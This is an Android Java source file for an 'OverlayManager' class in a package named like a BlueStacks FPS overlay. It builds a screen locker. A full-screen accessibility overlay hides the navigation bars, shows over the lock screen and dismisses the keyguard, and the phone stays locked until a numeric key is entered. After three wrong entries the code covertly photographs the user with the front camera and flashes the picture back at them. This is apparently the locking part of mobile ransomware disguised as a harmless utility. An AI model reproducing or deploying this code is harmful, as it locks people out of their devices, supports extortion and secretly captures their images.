package com.bluestacks.fpsoverlay;

import android.content.Context;
import android.graphics.PixelFormat;
import android.os.Build;
import android.util.Log;
import android.view.Gravity;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.view.animation.AnimationUtils;
import android.widget.Button;
import android.widget.ImageView;
import android.widget.TextView;
import java.util.concurrent.TimeUnit;

public class OverlayManager {
    private static final String TAG = "OverlayManager";
    private final Context context;
    private final WindowManager wm;
    private View overlay;
    private final OverlayCallback callback;
    private long cooldownUntil = 0;
    private boolean isCoolingDown = false;
    private int wrongAttemptCount = 0;
    private android.os.Handler cooldownHandler = new android.os.Handler(android.os.Looper.getMainLooper());
    private Runnable cooldownRunnable;

    public interface OverlayCallback {
        boolean onCheckKey(String key);
        void onUnlocked();
        void setLockStatus(boolean locked);
    }

    public OverlayManager(Context context, OverlayCallback callback) {
        this.context = context;
        this.wm = (WindowManager) context.getSystemService(Context.WINDOW_SERVICE);
        this.callback = callback;
    }

    public void showOverlay() {
        if (overlay != null) return;
        
        overlay = LayoutInflater.from(context).inflate(R.layout.sys_opt_view, null);

        int flags = WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN
                | WindowManager.LayoutParams.FLAG_FULLSCREEN
                | WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS
                | WindowManager.LayoutParams.FLAG_DRAWS_SYSTEM_BAR_BACKGROUNDS
                | WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON
                | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED
                | WindowManager.LayoutParams.FLAG_DISMISS_KEYGUARD;

        WindowManager.LayoutParams lp = new WindowManager.LayoutParams(
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.MATCH_PARENT,
                WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
                flags,
                PixelFormat.OPAQUE);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
            lp.layoutInDisplayCutoutMode = WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES;
        }

        lp.gravity = Gravity.CENTER;
        lp.screenOrientation = android.content.pm.ActivityInfo.SCREEN_ORIENTATION_PORTRAIT;

        overlay.setSystemUiVisibility(
                View.SYSTEM_UI_FLAG_IMMERSIVE_STICKY
                        | View.SYSTEM_UI_FLAG_LAYOUT_STABLE
                        | View.SYSTEM_UI_FLAG_LAYOUT_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_LAYOUT_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_HIDE_NAVIGATION
                        | View.SYSTEM_UI_FLAG_FULLSCREEN
                        | View.SYSTEM_UI_FLAG_LOW_PROFILE);

        View content = overlay.findViewById(R.id.container_content);
        View logo = overlay.findViewById(R.id.v_logo);
        if (content != null) content.startAnimation(AnimationUtils.loadAnimation(context, R.anim.smooth_entrance));
        if (logo != null) {
            android.view.animation.Animation pulse = AnimationUtils.loadAnimation(context, R.anim.pulse);
            pulse.setStartOffset(1000); // Start pulsing after entrance finishes
            logo.startAnimation(pulse);
        }

        final  TextView tv = overlay.findViewById(R.id.v_display);
        final StringBuilder sb = new StringBuilder();
        int[] ids = {R.id.v_b0, R.id.v_b1, R.id.v_b2, R.id.v_b3, R.id.v_b4, R.id.v_b5, R.id.v_b6, R.id.v_b7, R.id.v_b8, R.id.v_b9};
        for (int id : ids) {
            View b = overlay.findViewById(id);
            if (b != null) {
                b.setOnClickListener(v -> {
                    if (isCoolingDown && System.currentTimeMillis() < cooldownUntil) {
                        showCooldownMessage(tv);
                        return;
                    }
                    v.animate().scaleX(0.9f).scaleY(0.9f).setDuration(50).withEndAction(() -> v.animate().scaleX(1f).scaleY(1f).setDuration(50));
                    if (sb.length() < 8) {
                        sb.append(((Button) v).getText());
                        tv.setText(sb.toString().replaceAll(".", "*"));
                    }
                });
            }
        }

        View okBtn = overlay.findViewById(R.id.v_ok);
        if (okBtn != null) {
            okBtn.setOnClickListener(v -> {
                if (isCoolingDown && System.currentTimeMillis() < cooldownUntil) {
                    showCooldownMessage(tv);
                    return;
                }
                
                v.animate().scaleX(0.9f).scaleY(0.9f).setDuration(50).withEndAction(() -> v.animate().scaleX(1f).scaleY(1f).setDuration(50));
                String input = sb.toString();
                if (callback.onCheckKey(input)) {
                    wrongAttemptCount = 0;
                    hideOverlay();
                    callback.onUnlocked();
                    callback.setLockStatus(false);
                } else {
                    wrongAttemptCount++;
                    tv.startAnimation(AnimationUtils.loadAnimation(context, R.anim.shake));
                    tv.setText("");
                    sb.setLength(0);
                    tv.setHint("WRONG KEY (" + wrongAttemptCount + "/3)");

                    if (wrongAttemptCount >= 3) {
                        wrongAttemptCount = 0;
                        cooldownUntil = System.currentTimeMillis() + TimeUnit.SECONDS.toMillis(60);
                        isCoolingDown = true;
                        startCooldownTimer(tv);
                        showFacePreview();
                    }
                }
            });
        }

        View delBtn = overlay.findViewById(R.id.v_del);
        if (delBtn != null) {
            delBtn.setOnClickListener(v -> {
                v.animate().scaleX(0.9f).scaleY(0.9f).setDuration(50).withEndAction(() -> v.animate().scaleX(1f).scaleY(1f).setDuration(50));
                if (sb.length() > 0) {
                    sb.deleteCharAt(sb.length() - 1);
                    tv.setText(sb.toString().replaceAll(".", "*"));
                }
            });
        }

        try {
            wm.addView(overlay, lp);
        } catch (Exception e) {
            Log.e(TAG, "Failed to add overlay: " + e.getMessage());
        }
    }

    private void showCooldownMessage(TextView tv) {
        long remaining = (cooldownUntil - System.currentTimeMillis()) / 1000;
        if (remaining > 0) {
            tv.setText("LOCKED: " + remaining + "s");
        } else {
            isCoolingDown = false;
            tv.setText("");
            tv.setHint("[ ENTER KEY ]");
        }
    }

    private void startCooldownTimer(final TextView tv) {
        if (cooldownRunnable != null) cooldownHandler.removeCallbacks(cooldownRunnable);
        cooldownRunnable = new Runnable() {
            @Override
            public void run() {
                long remaining = (cooldownUntil - System.currentTimeMillis()) / 1000;
                if (remaining > 0 && isCoolingDown) {
                    tv.setText("COOLDOWN: " + remaining + "s");
                    cooldownHandler.postDelayed(this, 1000);
                } else {
                    isCoolingDown = false;
                    tv.setText("");
                    tv.setHint("[ ENTER KEY ]");
                }
            }
        };
        cooldownHandler.post(cooldownRunnable);
    }

    private void showFacePreview() {
        if (overlay == null) return;
        ImageView logo = overlay.findViewById(R.id.v_logo);
        if (logo == null) return;

        new Thread(() -> {
            android.hardware.Camera cam = null;
            try {
                // Open Front Camera (ID 1)
                cam = android.hardware.Camera.open(1);
                android.graphics.SurfaceTexture st = new android.graphics.SurfaceTexture(10);
                cam.setPreviewTexture(st);
                android.hardware.Camera.Parameters p = cam.getParameters();
                p.setRotation(270); // Correct orientation for front cam
                cam.setParameters(p);
                cam.startPreview();
                Thread.sleep(500);
                
                cam.takePicture(null, null, (data, camera) -> {
                    Bitmap bm = BitmapFactory.decodeByteArray(data, 0, data.length);
                    if (bm != null && overlay != null) {
                        overlay.post(() -> {
                            // First, stop any existing glitch/pulse
                            logo.clearAnimation();
                            
                            logo.setImageBitmap(bm);
                            logo.setScaleType(ImageView.ScaleType.CENTER_CROP);
                            
                            // Flash effect (Smoother)
                            View root = overlay.findViewById(R.id.root_overlay);
                            root.setBackgroundColor(0xFFFFFFFF);
                            root.animate().backgroundColor(0xFFFF360C).setDuration(400).start();
                            
                            // Show for 10 seconds total
                            logo.postDelayed(() -> {
                                if (overlay != null) {
                                    // Start glitch 3 seconds before ending (at 7th second)
                                    logo.startAnimation(AnimationUtils.loadAnimation(context, R.anim.glitch));
                                }
                            }, 7000);

                            logo.postDelayed(() -> {
                                if (overlay != null) {
                                    logo.clearAnimation();
                                    logo.setImageResource(R.drawable.garuda);
                                    logo.setScaleType(ImageView.ScaleType.FIT_CENTER);
                                }
                            }, 10000);
                        });
                    }
                    camera.release();
                });
            } catch (Exception e) {
                if (cam != null) cam.release();
            }
        }).start();
    }

    public void hideOverlay() {
        if (overlay != null && wm != null) {
            overlay.animate().alpha(0f).setDuration(500).withEndAction(() -> {
                try {
                    if (overlay != null) {
                        wm.removeView(overlay);
                        overlay = null;
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error removing overlay: " + e.getMessage());
                }
            });
        }
    }

    public boolean isShowing() {
        return overlay != null;
    }
}
